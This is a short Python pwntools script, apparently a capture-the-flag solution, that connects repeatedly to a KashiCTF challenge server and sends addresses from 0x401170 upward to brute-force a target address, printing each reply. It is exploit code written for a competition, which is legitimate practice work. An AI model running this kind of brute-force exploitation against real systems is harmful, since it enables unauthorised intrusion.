from pwn import *

base_address = 0x0000000000401170

for i in range(100):
    # Create a new connection for each attempt
    p = remote("kashictf.iitbhucybersec.in", 18778)
    target_addr = base_address + i
    print(f"Tried with address: {hex(target_addr)}")
    p.sendline(hex(target_addr))
    print(p.recvall().strip().decode())
    p.close()
